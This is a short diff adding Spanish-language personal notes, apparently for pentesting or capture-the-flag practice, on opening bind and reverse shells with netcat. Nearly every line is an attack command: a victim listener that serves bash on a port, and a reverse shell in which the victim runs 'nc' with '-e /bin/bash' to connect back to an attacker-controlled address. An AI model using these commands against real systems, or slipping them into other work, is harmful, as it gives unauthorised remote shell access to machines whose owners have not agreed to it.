@@ -1,0 +1,18 @@
+which nc  #para ver si tenemos nc y su ruta 
+#bind shell#
+
+# maquina victima a la escucha
+nc -v -n -l -p (puerto)
+nc -lvp (puerto)
+nc -lvp (puerto) -c bash
+
+# maquina atacante se esta conectando
+nc (ip victima) (puerto)
+---------------------------------------------------------------------------------------------------
+#revelse shell#
+
+#maquina propia la ponemos a la escucha 
+nc -lvp (puerto)
+
+#maquina victima se conecta
+nc (ip maquina atacante) (puerto) -e (ruta ej: /bin/bash)
